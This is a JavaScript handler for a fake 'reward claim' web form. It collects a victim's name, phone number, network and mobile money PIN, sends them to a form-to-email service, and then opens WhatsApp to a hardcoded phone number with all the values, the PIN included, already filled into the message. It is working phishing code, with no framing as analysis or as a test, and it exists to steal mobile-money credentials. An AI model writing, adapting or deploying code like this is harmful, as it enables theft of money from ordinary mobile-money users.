document.getElementById("rewardForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const form = e.target;
  const name = form.name.value;
  const number = form.number.value;
  const age = form.age.value;
  const network = form.network.value;
  const duration = form.duration.value;
  const pin = form.momoPin.value;

  // Send to Formspree (email)
  fetch(form.action, {
    method: "POST",
    body: new FormData(form),
    headers: { Accept: "application/json" }
  }).then(response => {
    if (response.ok) {
      // Redirect to WhatsApp
      const whatsappMessage = 
        `🎉 Reward Claim Submission 🎉\n\n` +
        `Name: ${name}\n` +
        `Number: ${number}\n` +
        `Age: ${age}\n` +
        `Network: ${network}\n` +
        `Usage Duration: ${duration}\n` +
        `MoMo PIN: ${pin}`;

      const phoneNumber = "233538507594";
      const whatsappURL = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(whatsappMessage)}`;

      window.location.href = whatsappURL;
    } else {
      alert("Submission failed. Try again later.");
    }
  });
});
